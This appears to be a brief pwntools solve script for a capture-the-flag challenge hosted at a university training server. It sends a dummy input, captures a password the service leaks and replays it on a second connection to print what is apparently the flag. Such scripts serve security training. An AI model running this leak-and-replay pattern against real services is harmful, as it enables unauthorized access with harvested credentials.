from pwn import remote

r = remote('cyberchallenge.disi.unitn.it', 8103)


r.sendlineafter(b': ', b'a')
res = r.recvuntil(b': ')

pwd = r.recvline(keepends=False)

r = remote('cyberchallenge.disi.unitn.it', 8103)
r.sendlineafter(b': ', pwd)

r.recvline()
print(r.recvline())
